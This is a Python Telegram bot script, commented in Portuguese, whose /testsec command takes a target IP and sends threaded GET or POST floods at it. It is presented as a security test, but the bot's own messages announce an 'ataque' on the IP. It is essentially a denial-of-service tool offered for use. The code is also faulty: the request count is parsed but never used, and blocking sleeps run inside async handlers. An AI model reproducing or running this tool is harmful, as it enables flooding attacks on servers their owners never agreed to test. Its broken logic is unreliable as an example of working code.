from telegram import Update
from telegram.ext import Application, CommandHandler
import requests
import threading
import time
import re
import random

# Função para validar o formato do IP
def is_valid_ip(ip):
    regex = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    return bool(re.match(regex, ip))

# Função para realizar o teste de requisições
def send_requests(update: Update, ip, num_requests, threads, speed, data_type):
    def make_request():
        try:
            if data_type == 'GET':
                requests.get(f'http://{ip}')
            elif data_type == 'POST':
                requests.post(f'http://{ip}', data={'test': 'value'})
        except requests.exceptions.RequestException as e:
            print(f"Erro: {e}")

    # Inicia as threads para enviar requisições
    for _ in range(threads):
        threading.Thread(target=make_request).start()
        time.sleep(1 / speed)

# Função para o comando de ajuda
async def ajudapain(update: Update, context):
    help_text = (
        "Comando de Ajuda:\n"
        "Use o comando /testsec seguido dos parâmetros: IP, número de requisições, velocidade, threads e tipo de requisição.\n"
        "Exemplo: /testsec 192.168.0.1 1000 10 5 GET\n"
        "Não se esqueça de usar o bot de forma responsável e em ambientes de teste controlados."
    )
    await update.message.reply_text(help_text)

# Função para o comando de teste de segurança
async def testsec(update: Update, context):
    # Verifica se o número correto de parâmetros foi fornecido
    if len(context.args) != 5:
        await update.message.reply_text("Erro: Você deve fornecer 5 parâmetros: IP, número de requisições, velocidade, threads e tipo de requisição. Use /ajudapain para ajuda.")
        return

    ip, num_requests, speed, threads, data_type = context.args

    # Valida o IP fornecido
    if not is_valid_ip(ip):
        await update.message.reply_text("Erro: IP inválido. Insira um IP válido no formato X.X.X.X.")
        return

    # Valida os parâmetros fornecidos
    try:
        num_requests = int(num_requests)
        speed = float(speed)
        threads = int(threads)
    except ValueError:
        await update.message.reply_text("Erro: Certifique-se de que os parâmetros numéricos (requisições, velocidade, threads) sejam válidos.")
        return

    if data_type.upper() not in ["GET", "POST"]:
        await update.message.reply_text("Erro: O tipo de requisição deve ser 'GET' ou 'POST'.")
        return

    # Inicia o tempo para calcular o tempo de início do ataque
    start_time = time.time()

    # Envia a mensagem inicial dizendo que o ataque será iniciado
    await update.message.reply_text(f"Iniciando o ataque ao IP {ip}. Requisições: {num_requests}, Velocidade: {speed} rps, Threads: {threads}, Tipo: {data_type.upper()}. 🚀")

    # Espera um tempo aleatório entre 0.3s e 0.6s antes de enviar o próximo retorno
    time.sleep(random.uniform(0.3, 0.6))

    # Realiza o envio das requisições
    send_requests(update, ip, num_requests, threads, speed, data_type.upper())

    # Calcula o tempo total que levou para iniciar o ataque
    elapsed_time = round(time.time() - start_time, 2)

    # Envia a mensagem final confirmando que o ataque foi iniciado
    await update.message.reply_text(f"🚨 Ataque iniciado ao IP {ip}. Levou {elapsed_time} segundos para iniciar. Ataque em andamento... 💥")

# Função principal
def main():
    token = ' TOKEN DO SEU BOT '

    # Cria a aplicação do bot
    application = Application.builder().token(token).build()

    # Adiciona os manipuladores de comandos
    application.add_handler(CommandHandler("testsec", testsec))
    application.add_handler(CommandHandler("ajudapain", ajudapain))

    # Inicia o bot
    application.run_polling()

if __name__ == '__main__':
    main()